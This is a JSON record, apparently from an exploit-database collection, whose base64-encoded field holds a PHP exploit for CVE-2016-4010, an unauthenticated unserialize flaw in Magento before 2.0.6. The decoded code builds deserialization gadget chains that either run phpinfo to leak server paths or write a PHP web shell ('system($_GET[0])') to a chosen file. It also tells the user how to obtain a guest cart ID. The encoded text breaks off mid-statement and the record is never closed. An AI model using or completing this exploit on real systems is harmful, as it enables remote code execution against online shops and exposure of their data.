{
    "source": "exploit-database", 
    "exploit": "PD9waHANCg0KLy8gRXhwbG9pdCBUaXRsZTogW0NWRS0yMDE2LTQwMTBdIE1hZ2VudG8gdW5hdXRoZW50aWNhdGVkIGFyYml0cmFyeSB1bnNlcmlhbGl6ZSAtPiBhcmJpdHJhcnkgd3JpdGUgZmlsZQ0KLy8gRGF0ZTogMTgvMDUvMjA2DQovLyBFeHBsb2l0IEF1dGhvcjogYWdpeCAoZGlzY292ZXJlZCBieSBORVRBTkVMIFJVQklOKQ0KLy8gVmVuZG9yIEhvbWVwYWdlOiBodHRwczovL21hZ2VudG8uY29tDQovLyBWZXJzaW9uOiA8IDIuMC42DQovLyBDVkUgOiBDVkUtMjAxNi00MDEwDQoNCi8vIHRvIGdldCBhIHZhbGlkIGd1ZXN0Q2FydElkDQovLyAqIGFkZCBhbiBpdGVtIGluIHlvdXIgY2FydA0KLy8gKiBnbyB0byBjaGVja291dA0KLy8gKiBmaWxsIHRoZSBzaGlwcGluZyBhZGRyZXNzIHN0dWZmIGFuZCBsb29rIGF0IHRoZSBQT1NUIHJlcXVlc3QgdG8gL3Jlc3QvZGVmYXVsdC9WMS9ndWVzdC1jYXJ0cy88Z3Vlc3RDYXJ0SWQ+L3NoaXBwaW5nLWluZm9ybWF0aW9uDQovLyAoKiBpbiB0aGUgcmVzcG9uc2UgY2hlY2sgdGhlIHBheW1lbnQgbWV0aG9kIGl0IG1heSB2YXJ5IGZyb20gY2hlY2ttbykNCi8vDQovLyBJZiB5b3UgZGlkblwndCBwcm92aWRlIHdoZXJlVG9Xcml0ZSwgaXQgd2lsbCBleGVjdXRlIHBocGluZm8gdG8gbGVhayBwYXRoLg0KDQoNCmNsYXNzIE1hZ2VudG9fRnJhbWV3b3JrX1NpbXBsZXhtbF9Db25maWdfQ2FjaGVfRmlsZSBleHRlbmRzIERhdGFPYmplY3QNCnsNCiAgICBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkZGF0YSl7DQogICAgICAgICR0aGlzLT5fZGF0YSA9ICRkYXRhOw0KICAgIH0NCn0NCg0KY2xhc3MgQ3JlZGlzX0NsaWVudHsNCiAgICBjb25zdCBUWVBFX1NUUklORyAgICAgID0gJ3N0cmluZyc7DQogICAgY29uc3QgVFlQRV9MSVNUICAgICAgICA9ICdsaXN0JzsNCiAgICBjb25zdCBUWVBFX1NFVCAgICAgICAgID0gJ3NldCc7DQogICAgY29uc3QgVFlQRV9aU0VUICAgICAgICA9ICd6c2V0JzsNCiAgICBjb25zdCBUWVBFX0hBU0ggICAgICAgID0gJ2hhc2gnOw0KICAgIGNvbnN0IFRZUEVfTk9ORSAgICAgICAgPSAnbm9uZSc7DQogICAgY29uc3QgRlJFQURfQkxPQ0tfU0laRSA9IDgxOTI7DQoNCiAgICAvKioNCiAgICAgKiBTb2NrZXQgY29ubmVjdGlvbiB0byB0aGUgUmVkaXMgc2VydmVyIG9yIFJlZGlzIGxpYnJhcnkgaW5zdGFuY2UNCiAgICAgKiBAdmFyIHJlc291cmNlfFJlZGlzDQogICAgICovDQogICAgcHJvdGVjdGVkICRyZWRpczsNCiAgICBwcm90ZWN0ZWQgJHJlZGlzTXVsdGk7DQoNCiAgICAvKioNCiAgICAgKiBIb3N0IG9mIHRoZSBSZWRpcyBzZXJ2ZXINCiAgICAgKiBAdmFyIHN0cmluZw0KICAgICAqLw0KICAgIHByb3RlY3RlZCAkaG9zdDsNCg0KICAgIC8qKg0KICAgICAqIFBvcnQgb24gd2hpY2ggdGhlIFJlZGlzIHNlcnZlciBpcyBydW5uaW5nDQogICAgICogQHZhciBpbnRlZ2VyDQogICAgICovDQogICAgcHJvdGVjdGVkICRwb3J0Ow0KDQogICAgLyoqDQogICAgICogVGltZW91dCBmb3IgY29ubmVjdGluZyB0byBSZWRpcyBzZXJ2ZXINCiAgICAgKiBAdmFyIGZsb2F0DQogICAgICovDQogICAgcHJvdGVjdGVkICR0aW1lb3V0Ow0KDQogICAgLyoqDQogICAgICogVGltZW91dCBmb3IgcmVhZGluZyByZXNwb25zZSBmcm9tIFJlZGlzIHNlcnZlcg0KICAgICAqIEB2YXIgZmxvYXQNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJHJlYWRUaW1lb3V0Ow0KDQogICAgLyoqDQogICAgICogVW5pcXVlIGlkZW50aWZpZXIgZm9yIHBlcnNpc3RlbnQgY29ubmVjdGlvbnMNCiAgICAgKiBAdmFyIHN0cmluZw0KICAgICAqLw0KICAgIHByb3RlY3RlZCAkcGVyc2lzdGVudDsNCg0KICAgIC8qKg0KICAgICAqIEB2YXIgYm9vbA0KICAgICAqLw0KICAgIHByb3RlY3RlZCAkY2xvc2VPbkRlc3RydWN0ID0gVFJVRTsNCg0KICAgIC8qKg0KICAgICAqIEB2YXIgYm9vbA0KICAgICAqLw0KICAgIHByb3RlY3RlZCAkY29ubmVjdGVkID0gVFJVRTsNCg0KICAgIC8qKg0KICAgICAqIEB2YXIgYm9vbA0KICAgICAqLw0KICAgIHByb3RlY3RlZCAkc3RhbmRhbG9uZTsNCg0KICAgIC8qKg0KICAgICAqIEB2YXIgaW50DQogICAgICovDQogICAgcHJvdGVjdGVkICRtYXhDb25uZWN0UmV0cmllcyA9IDA7DQoNCiAgICAvKioNCiAgICAgKiBAdmFyIGludA0KICAgICAqLw0KICAgIHByb3RlY3RlZCAkY29ubmVjdEZhaWx1cmVzID0gMDsNCg0KICAgIC8qKg0KICAgICAqIEB2YXIgYm9vbA0KICAgICAqLw0KICAgIHByb3RlY3RlZCAkdXNlUGlwZWxpbmUgPSBGQUxTRTsNCg0KICAgIC8qKg0KICAgICAqIEB2YXIgYXJyYXkNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJGNvbW1hbmROYW1lczsNCg0KICAgIC8qKg0KICAgICAqIEB2YXIgc3RyaW5nDQogICAgICovDQogICAgcHJvdGVjdGVkICRjb21tYW5kczsNCg0KICAgIC8qKg0KICAgICAqIEB2YXIgYm9vbA0KICAgICAqLw0KICAgIHByb3RlY3RlZCAkaXNNdWx0aSA9IEZBTFNFOw0KDQogICAgLyoqDQogICAgICogQHZhciBib29sDQogICAgICovDQogICAgcHJvdGVjdGVkICRpc1dhdGNoaW5nID0gRkFMU0U7DQoNCiAgICAvKioNCiAgICAgKiBAdmFyIHN0cmluZw0KICAgICAqLw0KICAgIHByb3RlY3RlZCAkYXV0aFBhc3N3b3JkOw0KDQogICAgLyoqDQogICAgICogQHZhciBpbnQNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJHNlbGVjdGVkRGIgPSAwOw0KDQogICAgLyoqDQogICAgICogQWxpYXNlcyBmb3IgYmFja3dhcmRzIGNvbXBhdGliaWxpdHkgd2l0aCBwaHByZWRpcw0KICAgICAqIEB2YXIgYXJyYXkNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJHdyYXBwZXJNZXRob2RzID0gYXJyYXkoJ2RlbGV0ZScgPT4gJ2RlbCcsICdnZXRrZXlzJyA9PiAna2V5cycsICdzcmVtb3ZlJyA9PiAnc3JlbScpOw0KDQogICAgLyoqDQogICAgICogQHZhciBhcnJheQ0KICAgICAqLw0KICAgIHByb3RlY3RlZCAkcmVuYW1lZENvbW1hbmRzOw0KDQogICAgLyoqDQogICAgICogQHZhciBpbnQNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJHJlcXVlc3RzID0gMDsNCg0KDQogICAgcHVibGljIGZ1bmN0aW9uIF9fY29uc3RydWN0KCRyZXNvdXJjZSkgew0KICAgICAgICAkdGhpcy0+cmVkaXMgPSBuZXcgTWFnZW50b19TYWxlc19Nb2RlbF9PcmRlcl9QYXltZW50X1RyYW5zYWN0aW9uKCRyZXNvdXJjZSk7DQogICAgfQ0KfQ0KDQpjbGFzcyBEYXRhT2JqZWN0DQp7DQogICAgLyoqDQogICAgICogT2JqZWN0IGF0dHJpYnV0ZXMNCiAgICAgKg0KICAgICAqIEB2YXIgYXJyYXkNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJF9kYXRhID0gW107DQoNCiAgICAvKioNCiAgICAgKiBTZXR0ZXIvR2V0dGVyIHVuZGVyc2NvcmUgdHJhbnNmb3JtYXRpb24gY2FjaGUNCiAgICAgKg0KICAgICAqIEB2YXIgYXJyYXkNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgc3RhdGljICRfdW5kZXJzY29yZUNhY2hlID0gW107DQp9DQoNCmFic3RyYWN0IGNsYXNzIEFic3RyYWN0TW9kZWwyIGV4dGVuZHMgRGF0YU9iamVjdA0Kew0KICAgIC8qKg0KICAgICAqIFByZWZpeCBvZiBtb2RlbCBldmVudHMgbmFtZXMNCiAgICAgKg0KICAgICAqIEB2YXIgc3RyaW5nDQogICAgICovDQogICAgcHJvdGVjdGVkICRfZXZlbnRQcmVmaXggPSAnY29yZV9hYnN0cmFjdCc7DQoNCiAgICAvKioNCiAgICAgKiBQYXJhbWV0ZXIgbmFtZSBpbiBldmVudA0KICAgICAqDQogICAgICogSW4gb2JzZXJ2ZSBtZXRob2QgeW91IGNhbiB1c2UgJG9ic2VydmVyLT5nZXRFdmVudCgpLT5nZXRPYmplY3QoKSBpbiB0aGlzIGNhc2UNCiAgICAgKg0KICAgICAqIEB2YXIgc3RyaW5nDQogICAgICovDQogICAgcHJvdGVjdGVkICRfZXZlbnRPYmplY3QgPSAnb2JqZWN0JzsNCg0KICAgIC8qKg0KICAgICAqIE5hbWUgb2Ygb2JqZWN0IGlkIGZpZWxkDQogICAgICoNCiAgICAgKiBAdmFyIHN0cmluZw0KICAgICAqLw0KICAgIHByb3RlY3RlZCAkX2lkRmllbGROYW1lID0gJ2lkJzsNCg0KICAgIC8qKg0KICAgICAqIERhdGEgY2hhbmdlcyBmbGFnICh0cnVlIGFmdGVyIHNldERhdGF8dW5zZXREYXRhIGNhbGwpDQogICAgICogQHZhciAkX2hhc0RhdGFDaGFuZ2UgYm9vbA0KICAgICAqLw0KICAgIHByb3RlY3RlZCAkX2hhc0RhdGFDaGFuZ2VzID0gZmFsc2U7DQoNCiAgICAvKioNCiAgICAgKiBPcmlnaW5hbCBkYXRhIHRoYXQgd2FzIGxvYWRlZA0KICAgICAqDQogICAgICogQHZhciBhcnJheQ0KICAgICAqLw0KICAgIHByb3RlY3RlZCAkX29yaWdEYXRhOw0KDQogICAgLyoqDQogICAgICogT2JqZWN0IGRlbGV0ZSBmbGFnDQogICAgICoNCiAgICAgKiBAdmFyIGJvb2wNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJF9pc0RlbGV0ZWQgPSBmYWxzZTsNCg0KICAgIC8qKg0KICAgICAqIFJlc291cmNlIG1vZGVsIGluc3RhbmNlDQogICAgICoNCiAgICAgKiBAdmFyIFxNYWdlbnRvXEZyYW1ld29ya1xNb2RlbFxSZXNvdXJjZU1vZGVsXERiXEFic3RyYWN0RGINCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJF9yZXNvdXJjZTsNCg0KICAgIC8qKg0KICAgICAqIFJlc291cmNlIGNvbGxlY3Rpb24NCiAgICAgKg0KICAgICAqIEB2YXIgXE1hZ2VudG9cRnJhbWV3b3JrXE1vZGVsXFJlc291cmNlTW9kZWxcRGJcQ29sbGVjdGlvblxBYnN0cmFjdENvbGxlY3Rpb24NCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJF9yZXNvdXJjZUNvbGxlY3Rpb247DQoNCiAgICAvKioNCiAgICAgKiBOYW1lIG9mIHRoZSByZXNvdXJjZSBtb2RlbA0KICAgICAqDQogICAgICogQHZhciBzdHJpbmcNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJF9yZXNvdXJjZU5hbWU7DQoNCiAgICAvKioNCiAgICAgKiBOYW1lIG9mIHRoZSByZXNvdXJjZSBjb2xsZWN0aW9uIG1vZGVsDQogICAgICoNCiAgICAgKiBAdmFyIHN0cmluZw0KICAgICAqLw0KICAgIHByb3RlY3RlZCAkX2NvbGxlY3Rpb25OYW1lOw0KDQogICAgLyoqDQogICAgICogTW9kZWwgY2FjaGUgdGFnIGZvciBjbGVhciBjYWNoZSBpbiBhZnRlciBzYXZlIGFuZCBhZnRlciBkZWxldGUNCiAgICAgKg0KICAgICAqIFdoZW4geW91IHVzZSB0cnVlIC0gYWxsIGNhY2hlIHdpbGwgYmUgY2xlYW4NCiAgICAgKg0KICAgICAqIEB2YXIgc3RyaW5nfGFycmF5fGJvb2wNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJF9jYWNoZVRhZyA9IGZhbHNlOw0KDQogICAgLyoqDQogICAgICogRmxhZyB3aGljaCBjYW4gc3RvcCBkYXRhIHNhdmluZyBhZnRlciBiZWZvcmUgc2F2ZQ0KICAgICAqIENhbiBiZSB1c2VkIGZvciBuZXh0IHNlcXVlbmNlOiB3ZSBjaGVjayBkYXRhIGluIF9iZWZvcmVTYXZlLCBpZiBkYXRhIGFyZQ0KICAgICAqIG5vdCB2YWxpZCAtIHdlIGNhbiBzZXQgdGhpcyBmbGFnIHRvIGZhbHNlIHZhbHVlIGFuZCBzYXZlIHByb2Nlc3Mgd2lsbCBiZSBzdG9wcGVkDQogICAgICoNCiAgICAgKiBAdmFyIGJvb2wNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJF9kYXRhU2F2ZUFsbG93ZWQgPSB0cnVlOw0KDQogICAgLyoqDQogICAgICogRmxhZyB3aGljaCBhbGxvdyBkZXRlY3Qgb2JqZWN0IHN0YXRlOiBpcyBpdCBuZXcgb2JqZWN0ICh3aXRob3V0IGlkKSBvciBleGlzdGluZyBvbmUgKHdpdGggaWQpDQogICAgICoNCiAgICAgKiBAdmFyIGJvb2wNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJF9pc09iamVjdE5ldyA9IG51bGw7DQoNCiAgICAvKioNCiAgICAgKiBWYWxpZGF0b3IgZm9yIGNoZWNraW5nIHRoZSBtb2RlbCBzdGF0ZSBiZWZvcmUgc2F2aW5nIGl0DQogICAgICoNCiAgICAgKiBAdmFyIFxaZW5kX1ZhbGlkYXRlX0ludGVyZmFjZXxib29sfG51bGwNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJF92YWxpZGF0b3JCZWZvcmVTYXZlID0gbnVsbDsNCg0KICAgIC8qKg0KICAgICAqIEFwcGxpY2F0aW9uIEV2ZW50IERpc3BhdGNoZXINCiAgICAgKg0KICAgICAqIEB2YXIgXE1hZ2VudG9cRnJhbWV3b3JrXEV2ZW50XE1hbmFnZXJJbnRlcmZhY2UNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJF9ldmVudE1hbmFnZXI7DQoNCiAgICAvKioNCiAgICAgKiBBcHBsaWNhdGlvbiBDYWNoZSBNYW5hZ2VyDQogICAgICoNCiAgICAgKiBAdmFyIFxNYWdlbnRvXEZyYW1ld29ya1xBcHBcQ2FjaGVJbnRlcmZhY2UNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJF9jYWNoZU1hbmFnZXI7DQoNCiAgICAvKioNCiAgICAgKiBAdmFyIFxNYWdlbnRvXEZyYW1ld29ya1xSZWdpc3RyeQ0KICAgICAqLw0KICAgIHByb3RlY3RlZCAkX3JlZ2lzdHJ5Ow0KDQogICAgLyoqDQogICAgICogQHZhciBcUHNyXExvZ1xMb2dnZXJJbnRlcmZhY2UNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJF9sb2dnZXI7DQoNCiAgICAvKioNCiAgICAgKiBAdmFyIFxNYWdlbnRvXEZyYW1ld29ya1xBcHBcU3RhdGUNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJF9hcHBTdGF0ZTsNCg0KICAgIC8qKg0KICAgICAqIEB2YXIgXE1hZ2VudG9cRnJhbWV3b3JrXE1vZGVsXEFjdGlvblZhbGlkYXRvclxSZW1vdmVBY3Rpb24NCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJF9hY3Rpb25WYWxpZGF0b3I7DQoNCiAgICAvKioNCiAgICAgKiBBcnJheSB0byBzdG9yZSBvYmplY3QncyBvcmlnaW5hbCBkYXRhDQogICAgICoNCiAgICAgKiBAdmFyIGFycmF5DQogICAgICovDQogICAgcHJvdGVjdGVkICRzdG9yZWREYXRhID0gW107DQp9DQoNCmFic3RyYWN0IGNsYXNzIEFic3RyYWN0RXh0ZW5zaWJsZU1vZGVsIGV4dGVuZHMgQWJzdHJhY3RNb2RlbDINCnsNCiAgICBwcm90ZWN0ZWQgJGV4dGVuc2lvbkF0dHJpYnV0ZXNGYWN0b3J5Ow0KDQogICAgLyoqDQogICAgICogQHZhciBcTWFnZW50b1xGcmFtZXdvcmtcQXBpXEV4dGVuc2lvbkF0dHJpYnV0ZXNJbnRlcmZhY2UNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJGV4dGVuc2lvbkF0dHJpYnV0ZXM7DQoNCiAgICAvKioNCiAgICAgKiBAdmFyIEF0dHJpYnV0ZVZhbHVlRmFjdG9yeQ0KICAgICAqLw0KICAgIHByb3RlY3RlZCAkY3VzdG9tQXR0cmlidXRlRmFjdG9yeTsNCg0KICAgIC8qKg0KICAgICAqIEB2YXIgc3RyaW5nW10NCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJGN1c3RvbUF0dHJpYnV0ZXNDb2RlcyA9IG51bGw7DQoNCiAgICAvKioNCiAgICAgKiBAdmFyIGJvb2wNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJGN1c3RvbUF0dHJpYnV0ZXNDaGFuZ2VkID0gZmFsc2U7DQoNCn0NCg0KYWJzdHJhY3QgY2xhc3MgQWJzdHJhY3RNb2RlbCBleHRlbmRzIEFic3RyYWN0RXh0ZW5zaWJsZU1vZGVsDQp7DQp9DQoNCmNsYXNzIE1hZ2VudG9fU2FsZXNfTW9kZWxfT3JkZXJfUGF5bWVudF9UcmFuc2FjdGlvbiBleHRlbmRzIEFic3RyYWN0TW9kZWwNCnsNCiAgICAvKiojQCsNCiAgICAgKiBTdXBwb3J0ZWQgdHJhbnNhY3Rpb24gdHlwZXMNCiAgICAgKiBAdmFyIHN0cmluZw0KICAgICAqLw0KICAgIGNvbnN0IFRZUEVfUEFZTUVOVCA9ICdwYXltZW50JzsNCg0KICAgIGNvbnN0IFRZUEVfT1JERVIgPSAnb3JkZXInOw0KDQogICAgY29uc3QgVFlQRV9BVVRIID0gJ2F1dGhvcml6YXRpb24nOw0KDQogICAgY29uc3QgVFlQRV9DQVBUVVJFID0gJ2NhcHR1cmUnOw0KDQogICAgY29uc3QgVFlQRV9WT0lEID0gJ3ZvaWQnOw0KDQogICAgY29uc3QgVFlQRV9SRUZVTkQgPSAncmVmdW5kJzsNCg0KICAgIC8qKiNALSovDQoNCiAgICAvKioNCiAgICAgKiBSYXcgZGV0YWlscyBrZXkgaW4gYWRkaXRpb25hbCBpbmZvDQogICAgICovDQogICAgY29uc3QgUkFXX0RFVEFJTFMgPSAncmF3X2RldGFpbHNfaW5mbyc7DQoNCiAgICAvKioNCiAgICAgKiBPcmRlciBpbnN0YW5jZQ0KICAgICAqDQogICAgICogQHZhciBcTWFnZW50b1xTYWxlc1xNb2RlbFxPcmRlclxQYXltZW50DQogICAgICovDQogICAgcHJvdGVjdGVkICRfb3JkZXIgPSBudWxsOw0KDQogICAgLyoqDQogICAgICogUGFyZW50IHRyYW5zYWN0aW9uIGluc3RhbmNlDQogICAgICogQHZhciBcTWFnZW50b1xTYWxlc1xNb2RlbFxPcmRlclxQYXltZW50XFRyYW5zYWN0aW9uDQogICAgICovDQogICAgcHJvdGVjdGVkICRfcGFyZW50VHJhbnNhY3Rpb24gPSBudWxsOw0KDQogICAgLyoqDQogICAgICogQ2hpbGQgdHJhbnNhY3Rpb25zLCBhc3NvYyBhcnJheSBvZiB0cmFuc2FjdGlvbl9pZCA9PiBpbnN0YW5jZQ0KICAgICAqDQogICAgICogQHZhciBhcnJheQ0KICAgICAqLw0KICAgIHByb3RlY3RlZCAkX2NoaWxkcmVuID0gbnVsbDsNCg0KICAgIC8qKg0KICAgICAqIENoaWxkIHRyYW5zYWN0aW9ucywgYXNzb2MgYXJyYXkgb2YgdHhuX2lkID0+IGluc3RhbmNlDQogICAgICogRmlsbGVkIG9ubHkgaW4gY2FzZSB3aGVuIGFsbCBjaGlsZCB0cmFuc2FjdGlvbnMgaGF2ZSB0eG5faWQNCiAgICAgKiBVc2VkIGZvciBxdWlja2VyIHNlYXJjaCBvZiBjaGlsZCB0cmFuc2FjdGlvbnMgdXNpbmcgaXNzZXQoKSBhcyBvcHBvc2l0ZSB0byBmb3JlYWNoaW5nICRfY2hpbGRyZW4NCiAgICAgKg0KICAgICAqIEB2YXIgYXJyYXkNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJF9pZGVudGlmaWVkQ2hpbGRyZW4gPSBudWxsOw0KDQogICAgLyoqDQogICAgICogV2hldGhlciB0byBwZXJmb3JtIGF1dG9tYXRpYyBhY3Rpb25zIG9uIHRyYW5zYWN0aW9ucywgc3VjaCBhcyBhdXRvLWNsb3NpbmcgYW5kIHB1dHRpbmcgYXMgYSBwYXJlbnQNCiAgICAgKg0KICAgICAqIEB2YXIgYm9vbA0KICAgICAqLw0KICAgIHByb3RlY3RlZCAkX3RyYW5zYWN0aW9uc0F1dG9MaW5raW5nID0gdHJ1ZTsNCg0KICAgIC8qKg0KICAgICAqIFdoZXRoZXIgdG8gdGhyb3cgZXhjZXB0aW9ucyBvbiBkaWZmZXJlbnQgb3BlcmF0aW9ucw0KICAgICAqDQogICAgICogQHZhciBib29sDQogICAgICovDQogICAgcHJvdGVjdGVkICRfaXNGYWlsc2FmZSA9IHRydWU7DQoNCiAgICAvKioNCiAgICAgKiBXaGV0aGVyIHRyYW5zYWN0aW9uIGhhcyBjaGlsZHJlbg0KICAgICAqDQogICAgICogQHZhciBib29sDQogICAgICovDQogICAgcHJvdGVjdGVkICRfaGFzQ2hpbGQgPSBudWxsOw0KDQogICAgLyoqDQogICAgICogRXZlbnQgb2JqZWN0IHByZWZpeA0KICAgICAqDQogICAgICogQHZhciBzdHJpbmcNCiAgICAgKiBAc2VlIFxNYWdlbnRvXEZyYW1ld29ya1xNb2RlbFxBYnN0cmFjdE1vZGVsOjokX2V2ZW50UHJlZml4DQogICAgICovDQogICAgcHJvdGVjdGVkICRfZXZlbnRQcmVmaXggPSAnc2FsZXNfb3JkZXJfcGF5bWVudF90cmFuc2FjdGlvbic7DQoNCiAgICAvKioNCiAgICAgKiBFdmVudCBvYmplY3QgcHJlZml4DQogICAgICoNCiAgICAgKiBAdmFyIHN0cmluZw0KICAgICAqIEBzZWUgXE1hZ2VudG9cRnJhbWV3b3JrXE1vZGVsXEFic3RyYWN0TW9kZWw6OiRfZXZlbnRPYmplY3QNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJF9ldmVudE9iamVjdCA9ICdvcmRlcl9wYXltZW50X3RyYW5zYWN0aW9uJzsNCg0KICAgIC8qKg0KICAgICAqIE9yZGVyIHdlYnNpdGUgaWQNCiAgICAgKg0KICAgICAqIEB2YXIgaW50DQogICAgICovDQogICAgcHJvdGVjdGVkICRfb3JkZXJXZWJzaXRlSWQgPSBudWxsOw0KDQogICAgLyoqDQogICAgICogQHZhciBcTWFnZW50b1xTYWxlc1xNb2RlbFxPcmRlckZhY3RvcnkNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJF9vcmRlckZhY3Rvcnk7DQoNCiAgICAvKioNCiAgICAgKiBAdmFyIFxNYWdlbnRvXEZyYW1ld29ya1xTdGRsaWJcRGF0ZVRpbWVcRGF0ZVRpbWVGYWN0b3J5DQogICAgICovDQogICAgcHJvdGVjdGVkICRfZGF0ZUZhY3Rvcnk7DQoNCiAgICAvKioNCiAgICAgKiBAdmFyIFRyYW5zYWN0aW9uRmFjdG9yeQ0KICAgICAqLw0KICAgIHByb3RlY3RlZCAkX3RyYW5zYWN0aW9uRmFjdG9yeTsNCg0KICAgIC8qKg0KICAgICAqIEB2YXIgXE1hZ2VudG9cU2FsZXNcQXBpXE9yZGVyUGF5bWVudFJlcG9zaXRvcnlJbnRlcmZhY2UNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJG9yZGVyUGF5bWVudFJlcG9zaXRvcnk7DQoNCiAgICAvKioNCiAgICAgKiBAdmFyIFxNYWdlbnRvXFNhbGVzXEFwaVxPcmRlclJlcG9zaXRvcnlJbnRlcmZhY2UNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgJG9yZGVyUmVwb3NpdG9yeTsNCg0KICAgIC8qKg0KICAgICAqIEBwYXJhbSBcTWFnZW50b1xGcmFtZXdvcmtcTW9kZWxcQ29udGV4dCAkY29udGV4dA0KICAgICAqIEBwYXJhbSBcTWFnZW50b1xGcmFtZXdvcmtcUmVnaXN0cnkgJHJlZ2lzdHJ5DQogICAgICogQHBhcmFtIFxNYWdlbnRvXEZyYW1ld29ya1xBcGlcRXh0ZW5zaW9uQXR0cmlidXRlc0ZhY3RvcnkgJGV4dGVuc2lvbkZhY3RvcnkNCiAgICAgKiBAcGFyYW0gQXR0cmlidXRlVmFsdWVGYWN0b3J5ICRjdXN0b21BdHRyaWJ1dGVGYWN0b3J5DQogICAgICogQHBhcmFtIFxNYWdlbnRvXFNhbGVzXE1vZGVsXE9yZGVyRmFjdG9yeSAkb3JkZXJGYWN0b3J5DQogICAgICogQHBhcmFtIFxNYWdlbnRvXEZyYW1ld29ya1xTdGRsaWJcRGF0ZVRpbWVcRGF0ZVRpbWVGYWN0b3J5ICRkYXRlRmFjdG9yeQ0KICAgICAqIEBwYXJhbSBUcmFuc2FjdGlvbkZhY3RvcnkgJHRyYW5zYWN0aW9uRmFjdG9yeQ0KICAgICAqIEBwYXJhbSBcTWFnZW50b1xGcmFtZXdvcmtcTW9kZWxcUmVzb3VyY2VNb2RlbFxBYnN0cmFjdFJlc291cmNlICRyZXNvdXJjZQ0KICAgICAqIEBwYXJhbSBcTWFnZW50b1xGcmFtZXdvcmtcRGF0YVxDb2xsZWN0aW9uXEFic3RyYWN0RGIgJHJlc291cmNlQ29sbGVjdGlvbg0KICAgICAqIEBwYXJhbSBhcnJheSAkZGF0YQ0KICAgICAqIEBTdXBwcmVzc1dhcm5pbmdzKFBIUE1ELkV4Y2Vzc2l2ZVBhcmFtZXRlckxpc3QpDQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIF9fY29uc3RydWN0KCRyZXNvdXJjZSkgew0KICAgICAgICAkdGhpcy0+X3Jlc291cmNlID0gJHJlc291cmNlOw0KICAgIH0NCn0NCg0KY2xhc3MgTWFnZW50b19GcmFtZXdvcmtfREJfVHJhbnNhY3Rpb257DQogICAgcHJvdGVjdGVkICRfb2JqZWN0cyA9IFtdOw0KDQogICAgLyoqDQogICAgICogVHJhbnNhY3Rpb24gb2JqZWN0cyBhcnJheSB3aXRoIGFsaWFzIGtleQ0KICAgICAqDQogICAgICogQHZhciBhcnJheQ0KICAgICAqLw0KICAgIHByb3RlY3RlZCAkX29iamVjdHNCeUFsaWFzID0gW107DQoNCiAgICAvKioNCiAgICAgKiBDYWxsYmFja3MgYXJyYXkuDQogICAgICoNCiAgICAgKiBAdmFyIGFycmF5DQogICAgICovDQogICAgcHJvdGVjdGVkICRfYmVmb3JlQ29tbWl0Q2FsbGJhY2tzID0gWyJwaHBpbmZvIl07DQp9DQoNCmlmKGNvdW50KCRhcmd2KSA8IDMpew0KICAgIGVjaG8gJ1VzYWdlOiAnLiRhcmd2WzBdLicgPG1hZ2VudG9fdXJpPiA8Z3Vlc3RDYXJ0SWQ+ICh3aGVyZVRvV3JpdGUpJy5jaHIoMHgwYSk7DQogICAgZWNobyAnVG8gZ2V0IGEgdmFsaWQgZ3Vlc3RDYXJ0SWQnLmNocigweDBhKTsNCiAgICBlY2hvICcqIGFkZCBhbiBpdGVtIGluIHlvdXIgY2FydCcuY2hyKDB4MGEpOw0KICAgIGVjaG8gJyogZ28gdG8gY2hlY2tvdXQnLmNocigweDBhKTsNCiAgICBlY2hvICcqIGZpbGwgdGhlIHNoaXBwaW5nIGFkZHJlc3Mgc3R1ZmYgYW5kIGxvb2sgYXQgdGhlIFBPU1QgcmVxdWVzdCB0byAvcmVzdC9kZWZhdWx0L1YxL2d1ZXN0LWNhcnRzLzxndWVzdENhcnRJZD4vc2hpcHBpbmctaW5mb3JtYXRpb24nLmNocigweDBhKTsNCiAgICBlY2hvICcoKiBpbiB0aGUgcmVzcG9uc2UgY2hlY2sgdGhlIHBheW1lbnQgbWV0aG9kIGl0IG1heSB2YXJ5IGZyb20gImNoZWNrbW8iKScuY2hyKDB4MGEpLmNocigweDBhKTsNCiAgICBlY2hvICdJZiB5b3UgZGlkblwndCBwcm92aWRlIHdoZXJlVG9Xcml0ZSwgaXQgd2lsbCBleGVjdXRlIHBocGluZm8gdG8gbGVhayBwYXRoLicuY2hyKDB4MGEpOw0KICAgIGV4aXQoKTsNCn0NCg0KaWYoY291bnQoJGFyZ3YpID09PSA0KXsNCiAgICAkZGF0YSA9IFtdOw0KICAgICRkYXRhWydpc19hbGxvd2VkX3RvX3NhdmUnXSA9IFRydWU7DQogICAgJGRhdGFbJ3N0YXRfZmlsZV9uYW1lJ10gPSAkYXJndlszXTsNCiAgICAkZGF0YVsnY29tcG9uZW50cyddID0gJzw/cGhwIHN5c3RlbSgkX0dFVFswXSk7ID8+JzsNCiAgICAkcmVzb3VyY2UgPSBuZXcgTWFnZW50b19GcmFtZXdvcmtfU2ltcGxleG1sX0NvbmZpZ19DYWNoZV9GaWxlKCRkYXRhKTsNCn0NCmVsc2V7DQogICAgJHJlc291cmNlID0gbmV3IE1hZ2Vu